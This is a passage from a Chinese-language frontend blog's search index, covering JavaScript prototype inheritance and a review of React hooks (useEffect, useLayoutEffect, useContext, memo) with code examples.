class="line">        <span class="keyword">return</span> cloneTarget;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> target;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="5-实现继承"><a href="#5-实现继承" class="headerlink" title="5. 实现继承"></a>5. 实现继承</h1><blockquote><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/create">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/create</a></p></blockquote><p>ES5 环境下，可以使用 <code>SubClass.prototype = Object.create(ParentClass)</code> 来连接父类的原型链：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Shape - 父类(superclass)</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Shape</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">x</span> = <span class="number">0</span>;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">y</span> = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 父类的方法</span></span><br><span class="line"><span class="title class_">Shape</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">move</span> = <span class="keyword">function</span>(<span class="params">x, y</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">x</span> += x;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">y</span> += y;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">info</span>(<span class="string">&#x27;Shape moved.&#x27;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Rectangle - 子类(subclass)</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Rectangle</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="title class_">Shape</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>); <span class="comment">// call super constructor.</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 子类续承父类</span></span><br><span class="line"><span class="title class_">Rectangle</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="title class_">Shape</span>.<span class="property"><span class="keyword">prototype</span></span>);</span><br><span class="line"><span class="title class_">Rectangle</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">constructor</span> = <span class="title class_">Rectangle</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> rect = <span class="keyword">new</span> <span class="title class_">Rectangle</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Is rect an instance of Rectangle?&#x27;</span>,</span><br><span class="line">  rect <span class="keyword">instanceof</span> <span class="title class_">Rectangle</span>); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Is rect an instance of Shape?&#x27;</span>,</span><br><span class="line">  rect <span class="keyword">instanceof</span> <span class="title class_">Shape</span>); <span class="comment">// true</span></span><br><span class="line">rect.<span class="title function_">move</span>(<span class="number">1</span>, <span class="number">1</span>); <span class="comment">// Outputs, &#x27;Shape moved.&#x27;</span></span><br></pre></td></tr></table></figure><p>如果你希望能继承到多个对象，则可以使用混入的方式。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">MyClass</span>(<span class="params"></span>) &#123;</span><br><span class="line">     <span class="title class_">SuperClass</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>);</span><br><span class="line">     <span class="title class_">OtherSuperClass</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 继承一个类</span></span><br><span class="line"><span class="title class_">MyClass</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="title class_">SuperClass</span>.<span class="property"><span class="keyword">prototype</span></span>);</span><br><span class="line"><span class="comment">// 混合其它</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">assign</span>(<span class="title class_">MyClass</span>.<span class="property"><span class="keyword">prototype</span></span>, <span class="title class_">OtherSuperClass</span>.<span class="property"><span class="keyword">prototype</span></span>);</span><br><span class="line"><span class="comment">// 重新指定constructor</span></span><br><span class="line"><span class="title class_">MyClass</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">constructor</span> = <span class="title class_">MyClass</span>;</span><br><span class="line"></span><br><span class="line"><span class="title class_">MyClass</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">myMethod</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">     <span class="comment">// do a thing</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>更低版本的 ES 标准下，可以使用 new 关键字的特性来模拟 <code>Object.create</code>：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">objectCreate</span>(<span class="params">o</span>) &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">F</span>(<span class="params"></span>)&#123;&#125;;</span><br><span class="line">    F.<span class="property"><span class="keyword">prototype</span></span> = o;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title function_">F</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>温故知新,React基础Hook回顾</title>
      <link href="/2021/06/bde38e098f0b.html"/>
      <url>/2021/06/bde38e098f0b.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-useState"><a href="#1-useState" class="headerlink" title="1. useState"></a>1. useState</h1><p>略</p><h1 id="2-useEffect"><a href="#2-useEffect" class="headerlink" title="2. useEffect"></a>2. useEffect</h1><h2 id="2-1-什么是副作用"><a href="#2-1-什么是副作用" class="headerlink" title="2.1 什么是副作用"></a>2.1 什么是副作用</h2><p>副作用：纯函数只要和外部进行交互，都可以认为其有副作用</p><ol><li>引用外部变量；</li><li>调用外部函数；</li></ol><p>宗旨：相同的输入 ==一定会有==&gt; 相同的输出</p><p>只要不是在组件渲染时执行的操作，都是副作用操作。</p><p>一定会是副作用的操作：</p><ol><li>修改dom</li><li>修改全局变量 window</li><li>Ajax 请求</li><li>计时器</li><li>存储相关</li></ol><h2 id="2-2-useEffect-的调用时机，以及其与-class-组件生命周期的关系"><a href="#2-2-useEffect-的调用时机，以及其与-class-组件生命周期的关系" class="headerlink" title="2.2 useEffect 的调用时机，以及其与 class 组件生命周期的关系"></a>2.2 useEffect 的调用时机，以及其与 class 组件生命周期的关系</h2><blockquote><p>如果你熟悉 React class 的生命周期函数，你可以把 <code>useEffect</code> Hook 看做 <code>componentDidMount</code>，<code>componentDidUpdate</code> 和 <code>componentWillUnmount</code> 这三个函数的组合。</p></blockquote><p><img src="https://i.loli.net/2021/05/16/cRXL7ywGoHx89hE.png" alt=""></p><blockquote><p>图片来源：<a href="https://projects.wojtekmaj.pl/react-lifecycle-methods-diagram/">https://projects.wojtekmaj.pl/react-lifecycle-methods-diagram/</a></p></blockquote><p>不同于 ClassComponent，当 componentDidMount、componentDidUpdate 执行时，真实 DOM 尚未构建完成；<strong>useEffect 是在真实 DOM 构建完成之后执行的</strong>，同时 useEffect 是 <strong>异步的</strong> 。</p><blockquote><p><strong><code>useEffect</code> 做了什么？</strong> </p><p>通过使用这个 Hook，你可以告诉 React 组件需要在渲染后执行某些操作。React 会保存你传递的函数（我们将它称之为 “effect”），并且在执行 <strong>DOM 更新之后调用它</strong>。</p><p><strong>为什么在组件内部调用 <code>useEffect</code>？</strong></p><p> 将 <code>useEffect</code> 放在组件内部让我们可以在 effect 中直接访问 <code>count</code> state 变量（或其他 props）。我们不需要特殊的 API 来读取它 —— 它已经保存在函数作用域中。<strong>Hook 使用了 JavaScript 的闭包机制</strong>，而不用在 JavaScript 已经提供了解决方案的情况下，还引入特定的 React API。</p><p><strong><code>useEffect</code> 会在每次渲染后都执行吗？</strong> </p><p>是的，默认情况下，它在第一次渲染之后<em>和</em>每次更新之后都会执行。你可能会更容易接受 effect 发生在“渲染之后”这种概念，不用再去考虑“挂载”还是“更新”。React 保证了每次运行 effect 的同时，DOM 都已经更新完毕。</p></blockquote><p>如果非要在 hook 中获取 DOM 更新前的状态并直行某些操作，可以使用 <code>useLayoutEffect</code>，其和 <code>componentDidMount</code> 在表现以及调用时机上 <strong>是完全等价的</strong> 。</p><blockquote><p>与 <code>componentDidMount</code> 或 <code>componentDidUpdate</code> 不同，使用 <code>useEffect</code> 调度的 effect 不会阻塞浏览器更新屏幕，这让你的应用看起来响应更快。大多数情况下，effect 不需要同步地执行。在个别情况下（例如测量布局），有单独的 <a href="https://zh-hans.reactjs.org/docs/hooks-reference.html#uselayouteffect"><code>useLayoutEffect</code></a> Hook 供你使用，其 API 与 <code>useEffect</code> 相同。</p></blockquote><p><code>useLayoutEffect</code> 是同步的，在 <code>useLayoutEffect</code> 执行的时候也能获取到最新的 DOM 状态，只不过会阻塞以及”打断“ DOM 的渲染，因此应该尽量避免在 useLayoutEffect 中进行复杂的操作，举例来说：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">React</span>, &#123; useEffect, useLayoutEffect, useState &#125; <span class="keyword">from</span> <span class="string">&quot;react&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">Home</span>: <span class="title class_">React</span>.<span class="property">FC</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> [text, setText] = useState&lt;<span class="built_in">string</span>&gt;(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// useEffect(() =&gt; &#123;</span></span><br><span class="line">  <span class="comment">//   let i = 0;</span></span><br><span class="line">  <span class="comment">//   while (i &lt;= 1000000) &#123;</span></span><br><span class="line">  <span class="comment">//     i++;</span></span><br><span class="line">  <span class="comment">//   &#125;</span></span><br><span class="line">  <span class="comment">//   setText(&quot;world hello&quot;);</span></span><br><span class="line">  <span class="comment">// &#125;, []);</span></span><br><span class="line"></span><br><span class="line">  <span class="title function_">useLayoutEffect</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt;= <span class="number">100000000</span>) &#123;</span><br><span class="line">      i++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> head = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#title&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(head?.<span class="property">innerHTML</span>); <span class="comment">// hello word</span></span><br><span class="line">    <span class="title function_">setText</span>(<span class="string">&quot;world hello&quot;</span>);</span><br><span class="line">  &#125;, []);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">id</span>=<span class="string">&quot;title&quot;</span>&gt;</span>&#123;text&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">Home</span>;</span><br></pre></td></tr></table></figure><p>当我们使用 useEffect 在组件创建后更新文本内容时，屏幕上会显示 “hello world” 后再转变为 “world hello”；</p><p>然而当我们使用 useLayoutEffect 在组件创建后更新文本内容时，屏幕上不会显示 “hello world” 而是直接显示 “world hello”，渲染似乎会被 useLayoutEffect 给”打断”掉，起渲染流程如下：</p><p><img src="https://i.loli.net/2021/05/17/6utCGzekOlRb3w2.png" alt="渲染流程"></p><h2 id="2-3-需要清除的-Effect"><a href="#2-3-需要清除的-Effect" class="headerlink" title="2.3 需要清除的 Effect"></a>2.3 需要清除的 Effect</h2><p>当使用 <code>useEffect</code> 时，可以返回一个函数，返回的这个函数被称为 <strong>清理函数</strong> 。每个 effect 都可以返回一个清除函数。如此可以将添加和移除订阅的逻辑放在一起。它们都属于 effect 的一部分。</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">useEffect</span>(<span class="function">()=&gt;</span>&#123;</span><br><span class="line"><span class="keyword">let</span> timer = <span class="built_in">setInterval</span>(<span class="function">()=&gt;</span>&#123;</span><br><span class="line">    <span class="title function_">setCount</span>(count + <span class="number">1</span>);</span><br><span class="line">  &#125;, <span class="number">1000</span>) </span><br><span class="line">  <span class="keyword">return</span> <span class="function">()=&gt;</span>&#123;</span><br><span class="line">    <span class="built_in">clearInterval</span>(timer); <span class="comment">// 形成闭包，可以获取到 timer</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>同时，清理函数不仅在上一个 Effect 被清除时执行，在组件卸载时也会执行。</p><h2 id="2-4-闭包问题"><a href="#2-4-闭包问题" class="headerlink" title="2.4 闭包问题"></a>2.4 闭包问题</h2><p>在前面，我们提到 Hook 使用了闭包机制，我们先看一个示例：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> [count, setCount] = <span class="title function_">useState</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_">useEffect</span>(<span class="function">()=&gt;</span>&#123;</span><br><span class="line"><span class="keyword">let</span> timer = <span class="built_in">setInterval</span>(<span class="function">()=&gt;</span>&#123;</span><br><span class="line">    <span class="title function_">setCount</span>(count + <span class="number">1</span>);</span><br><span class="line">  &#125;, <span class="number">1000</span>) </span><br><span class="line">  <span class="keyword">return</span> <span class="function">()=&gt;</span>&#123;</span><br><span class="line">    <span class="built_in">clearInterval</span>(timer);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;, [])</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;count&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>在上面的示例中，<code>count</code> 会一直为1，这是因为在执行定时器时形成了一个闭包，<code>setCount(count + 1)</code> 获取到的是闭包中的 <code>count</code>，也就是定时器最开始启用时的 <code>count</code>，在定时器执行过程中，是无法获取到最新的 <code>count</code>。同时浏览器也会报出一个警告，提醒开发人员在 <code>useEffect</code> 使用到了一个未声明的依赖项。</p><p>解决这个问题有两个办法：</p><ol><li>将 <code>count</code> 作为依赖项传入 <code>useEffect</code> 中，这样每次都能获取到最新的 <code>count</code>。其相当于每次 count 更新后都清除上个定时器并重新创建一个新的定时器；</li></ol><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">  const [count, setCount] = useState(0);</span><br><span class="line"></span><br><span class="line">  useEffect(()=&gt;&#123;</span><br><span class="line">    let timer = setInterval(()=&gt;&#123;</span><br><span class="line">      setCount(count + 1);</span><br><span class="line">    &#125;, 1000) </span><br><span class="line">    return ()=&gt;&#123;</span><br><span class="line">      clearInterval(timer);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="deletion">- &#125;, [])</span></span><br><span class="line"><span class="addition">+ &#125;, [count])</span></span><br><span class="line"></span><br><span class="line">  return &lt;div&gt;&#123;count&#125;&lt;/div&gt;</span><br></pre></td></tr></table></figure><ol start="2"><li><code>setCount</code> 传入一个函数，在函数中可以获取到最新的 state，这样就能摆脱闭包；在 React 执行渲染流程时会去执行 setCount 传入的函数，此时传入的 count 是最新的。</li></ol><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">  const [count, setCount] = useState(0);</span><br><span class="line"></span><br><span class="line">  useEffect(()=&gt;&#123;</span><br><span class="line">    let timer = setInterval(()=&gt;&#123;</span><br><span class="line"><span class="deletion">-     setCount(count + 1);</span></span><br><span class="line"><span class="addition">+     setCount(count =&gt; count + 1);</span></span><br><span class="line">    &#125;, 1000) </span><br><span class="line">    return ()=&gt;&#123;</span><br><span class="line">      clearInterval(timer);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;, [])</span><br><span class="line"></span><br><span class="line">  return &lt;div&gt;&#123;count&#125;&lt;/div&gt;</span><br></pre></td></tr></table></figure><h1 id="3-useContext"><a href="#3-useContext" class="headerlink" title="3. useContext"></a>3. useContext</h1><h2 id="3-1-使用-useContext"><a href="#3-1-使用-useContext" class="headerlink" title="3.1 使用 useContext"></a>3.1 使用 useContext</h2><p>可以使用 <code>useContext</code> 来获取上级组件的 Provider 中传入的 <code>value</code>，如下：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> themes = &#123;</span><br><span class="line">  <span class="attr">light</span>: &#123;</span><br><span class="line">    <span class="attr">foreground</span>: <span class="string">&quot;#000000&quot;</span>,</span><br><span class="line">    <span class="attr">background</span>: <span class="string">&quot;#eeeeee&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">dark</span>: &#123;</span><br><span class="line">    <span class="attr">foreground</span>: <span class="string">&quot;#ffffff&quot;</span>,</span><br><span class="line">    <span class="attr">background</span>: <span class="string">&quot;#222222&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">ThemeContext</span> = <span class="title class_">React</span>.<span class="title function_">createContext</span>(themes.<span class="property">light</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">App</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">ThemeContext.Provider</span> <span class="attr">value</span>=<span class="string">&#123;themes.dark&#125;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">Toolbar</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">ThemeContext.Provider</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Toolbar</span>(<span class="params">props</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">ThemedButton</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">ThemedButton</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> theme = <span class="title function_">useContext</span>(<span class="title class_">ThemeContext</span>);</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">button</span> <span class="attr">style</span>=<span class="string">&#123;&#123;</span> <span class="attr">background:</span> <span class="attr">theme.background</span>, <span class="attr">color:</span> <span class="attr">theme.foreground</span> &#125;&#125;&gt;</span></span></span><br><span class="line"><span class="language-xml">      I am styled by theme context!</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-2-使用-Consumer"><a href="#3-2-使用-Consumer" class="headerlink" title="3.2 使用 Consumer"></a>3.2 使用 Consumer</h2><p>除此之外，我们还可以使用 <code>Context.Consumer</code> 组件来获取 Provider 传入的 <code>value</code>，该组件可以传入一个函数，函数传入一个 <code>value</code> 并返回一个 ReactComponent：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">ThemedButton</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">ThemeContext.Consumer</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      &#123;</span></span><br><span class="line"><span class="language-xml">        theme =&gt; </span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">button</span> <span class="attr">style</span>=<span class="string">&#123;&#123;</span> <span class="attr">background:</span> <span class="attr">theme.background</span>, <span class="attr">color:</span> <span class="attr">theme.foreground</span> &#125;&#125;&gt;</span></span></span><br><span class="line"><span class="language-xml">            I am styled by theme context!</span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      &#125;</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">ThemeContext.Consumer</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="4-useMemo"><a href="#4-useMemo" class="headerlink" title="4. useMemo"></a>4. useMemo</h1><h2 id="4-1-memo-组件"><a href="#4-1-memo-组件" class="headerlink" title="4.1 memo 组件"></a>4.1 memo 组件</h2><p>使用 memo 创建函数组件可以让父组件重新渲染时，子组件不重新渲染，而是只有当子组件的 props 更新时，子组件才会被渲染：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">React</span>, &#123; memo, useState &#125; <span class="keyword">from</span> <span class="string">&quot;react&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">MemoComponent</span> = memo&lt;&#123; <span class="attr">count</span>: <span class="built_in">number</span> &#125;&gt;(<span class="function">(<span class="params">props</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 使用 memo 后，只有当组件的 props 改变后，才会触发组件重新渲染</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;render&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Memo Component<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;props.count&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">Home</span>: <span class="title class_">React</span>.<span class="property">FC</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> [count, setCount] = useState&lt;<span class="built_in">number</span>&gt;(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">handleClick</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    <span class="title function_">setCount</span>(count + <span class="number">1</span>);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">h1</span> <span class="attr">id</span>=<span class="string">&quot;title&quot;</span>&gt;</span>Home<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;handleClick&#125;</span> <span class="attr">id</span>=<span class="string">&quot;btn&quot;</span> <span class="attr">style</span>=<span class="string">&#123;&#123;</span> <span class="attr">marginLeft:</span> <span class="attr">count</span> &#125;&#125;&gt;</span></span></span><br><span class="line"><span class="language-xml">        Click&#123;count&#125;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      &#123;/* 传入子组件的 count 始终为 1，父组件的 count 更新时，子组件不更新 */&#125;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">MemoComponent</span> <span class="attr">count</span>=<span class="string">&#123;1&#125;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">Home</span>;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> React </category>
          
      </categories>
      
      
        <tags>
